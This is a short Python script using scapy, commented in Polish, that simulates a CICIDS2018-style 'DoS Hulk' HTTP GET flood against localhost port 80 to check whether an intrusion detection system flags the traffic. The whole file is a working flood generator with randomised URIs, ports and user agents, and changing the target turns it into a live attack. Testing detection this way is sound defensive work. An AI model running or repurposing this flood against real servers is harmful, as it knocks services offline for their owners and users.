#!/usr/bin/env python3

from scapy.all import *
import random
import time
import os

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

# Parametry na wzór CICIDS2018 DoS Hulk
PACKET_BURSTS = 40        # duża ilość flow
BURST_SIZE = 1500          # liczba pakietów w jednym flow
DELAY = 0.0003            # prawie zero przerw -> typowe dla DoS Hulk


def generate_hulk_like_attack():
    print("[*] Starting CICIDS2018 Hulk-like attack simulation...\n")

    for burst in range(PACKET_BURSTS):

        src_port = random.randint(1024, 65535)  # dynamiczny port - jak w Hulk
        uri = f"/test/{random.randint(1,999999)}"
        user_agent = random.choice([
            "Mozilla/5.0",
            "curl/7.58.0",
            "python-requests/2.26",
            "Wget/1.19.4"
        ])

        for i in range(BURST_SIZE):

            payload = (
                f"GET {uri} HTTP/1.1\r\n"
                f"Host: {TARGET_IP}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Accept: */*\r\n"
                f"Connection: Keep-Alive\r\n\r\n"
            ).encode()

            pkt = (
                IP(dst=TARGET_IP) /
                TCP(sport=src_port, dport=TARGET_PORT, flags="PA") /
                Raw(load=payload)
            )

            send(pkt, verbose=0)
            time.sleep(DELAY)

        print(f"[+] Burst {burst+1}/{PACKET_BURSTS} sent.")

    print("\n[✓] Attack simulation complete!")
    print("Your IDS should classify these flows as 'attack'.\n")


if __name__ == "__main__":
    generate_hulk_like_attack()
